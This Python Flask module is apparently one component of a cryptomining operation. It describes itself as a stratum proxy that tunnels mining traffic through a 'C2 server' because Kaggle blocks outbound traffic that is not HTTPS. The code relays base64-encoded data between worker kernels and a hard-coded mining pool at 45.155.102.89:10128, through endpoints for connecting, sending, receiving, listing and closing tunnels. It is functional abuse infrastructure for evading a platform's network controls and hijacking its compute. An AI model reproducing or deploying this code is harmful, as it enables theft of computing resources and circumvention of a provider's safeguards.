#!/usr/bin/env python3
"""
Stratum Proxy - Tunnels mining traffic through HTTPS for Kaggle kernels.
Kaggle blocks non-HTTPS outbound, so we proxy stratum through C2 server.
"""

import socket
import threading
import json
import time
import hashlib
from flask import Blueprint, request, jsonify, Response, session
from functools import wraps
from src.utils.logger import get_logger

log = get_logger('proxy')

# Blueprint for proxy routes
proxy_bp = Blueprint('proxy', __name__)

# Login required decorator for blueprint
def proxy_login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('user_id'):
            return jsonify({'error': 'unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated

# Active tunnel connections
tunnels = {}
tunnel_lock = threading.Lock()

class StratumProxy:
    """Proxies stratum protocol through HTTPS."""
    
    def __init__(self, pool_host, pool_port):
        self.pool_host = pool_host
        self.pool_port = pool_port
        self.pool_socket = None
        self.connected = False
        self.buffer = b''
        self.last_activity = time.time()
        
    def connect(self):
        """Connect to mining pool."""
        try:
            self.pool_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.pool_socket.settimeout(30)
            self.pool_socket.connect((self.pool_host, self.pool_port))
            self.connected = True
            log.info(f"Connected to pool {self.pool_host}:{self.pool_port}")
            return True
        except Exception as e:
            log.error(f"Pool connection failed: {e}")
            return False
    
    def send(self, data):
        """Send data to pool."""
        if not self.connected:
            if not self.connect():
                return None
        
        try:
            self.pool_socket.sendall(data)
            self.last_activity = time.time()
            return True
        except Exception as e:
            log.error(f"Pool send error: {e}")
            self.connected = False
            return None
    
    def recv(self, timeout=5):
        """Receive data from pool."""
        if not self.connected:
            return None
        
        try:
            self.pool_socket.settimeout(timeout)
            data = self.pool_socket.recv(4096)
            self.last_activity = time.time()
            return data
        except socket.timeout:
            return b''
        except Exception as e:
            log.error(f"Pool recv error: {e}")
            self.connected = False
            return None
    
    def close(self):
        """Close pool connection."""
        if self.pool_socket:
            try:
                self.pool_socket.close()
            except:
                pass
        self.connected = False


@proxy_bp.route('/tunnel/connect', methods=['POST'])
@proxy_login_required
def tunnel_connect():
    """Create new tunnel to pool."""
    data = request.json or {}
    worker_id = data.get('worker_id', '')
    pool = data.get('pool', '45.155.102.89:10128')
    
    if ':' in pool:
        host, port = pool.split(':')
        port = int(port)
    else:
        host, port = pool, 10128
    
    tunnel_id = hashlib.md5(f"{worker_id}-{time.time()}".encode()).hexdigest()[:16]
    
    proxy = StratumProxy(host, port)
    if proxy.connect():
        with tunnel_lock:
            tunnels[tunnel_id] = {
                'proxy': proxy,
                'worker_id': worker_id,
                'created': time.time(),
                'last_activity': time.time()
            }
        return jsonify({'status': 'ok', 'tunnel_id': tunnel_id})
    else:
        return jsonify({'status': 'error', 'error': 'connection failed'}), 500


@proxy_bp.route('/tunnel/send', methods=['POST'])
@proxy_login_required
def tunnel_send():
    """Send data through tunnel."""
    data = request.json or {}
    tunnel_id = data.get('tunnel_id', '')
    payload = data.get('data', '')
    
    if not tunnel_id or tunnel_id not in tunnels:
        return jsonify({'status': 'error', 'error': 'invalid tunnel'}), 404
    
    tunnel = tunnels[tunnel_id]
    proxy = tunnel['proxy']
    
    # Decode base64 payload
    import base64
    try:
        raw_data = base64.b64decode(payload)
    except:
        raw_data = payload.encode()
    
    if proxy.send(raw_data):
        tunnel['last_activity'] = time.time()
        return jsonify({'status': 'ok'})
    else:
        return jsonify({'status': 'error', 'error': 'send failed'}), 500


@proxy_bp.route('/tunnel/recv', methods=['POST'])
@proxy_login_required
def tunnel_recv():
    """Receive data from tunnel."""
    data = request.json or {}
    tunnel_id = data.get('tunnel_id', '')
    timeout = data.get('timeout', 5)
    
    if not tunnel_id or tunnel_id not in tunnels:
        return jsonify({'status': 'error', 'error': 'invalid tunnel'}), 404
    
    tunnel = tunnels[tunnel_id]
    proxy = tunnel['proxy']
    
    resp_data = proxy.recv(timeout)
    
    if resp_data is None:
        return jsonify({'status': 'error', 'error': 'connection lost'}), 500
    
    import base64
    encoded = base64.b64encode(resp_data).decode()
    
    tunnel['last_activity'] = time.time()
    return jsonify({'status': 'ok', 'data': encoded})


@proxy_bp.route('/tunnel/close', methods=['POST'])
@proxy_login_required
def tunnel_close():
    """Close tunnel."""
    data = request.json or {}
    tunnel_id = data.get('tunnel_id', '')
    
    if tunnel_id and tunnel_id in tunnels:
        tunnel = tunnels[tunnel_id]
        tunnel['proxy'].close()
        del tunnels[tunnel_id]
        return jsonify({'status': 'ok'})
    
    return jsonify({'status': 'error', 'error': 'invalid tunnel'}), 404


@proxy_bp.route('/tunnel/list', methods=['GET', 'POST'])
@proxy_login_required
def tunnel_list():
    """List active tunnels."""
    result = []
    with tunnel_lock:
        for tid, t in tunnels.items():
            result.append({
                'tunnel_id': tid,
                'worker_id': t['worker_id'],
                'connected': t['proxy'].connected,
                'last_activity': t['last_activity']
            })
    return jsonify({'tunnels': result})


def cleanup_tunnels():
    """Cleanup stale tunnels."""
    while True:
        time.sleep(60)
        now = time.time()
        with tunnel_lock:
            stale = [tid for tid, t in tunnels.items() 
                     if now - t['last_activity'] > 300]
            for tid in stale:
                log.info(f"Cleaning stale tunnel: {tid}")
                tunnels[tid]['proxy'].close()
                del tunnels[tid]


# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_tunnels, daemon=True)
cleanup_thread.start()
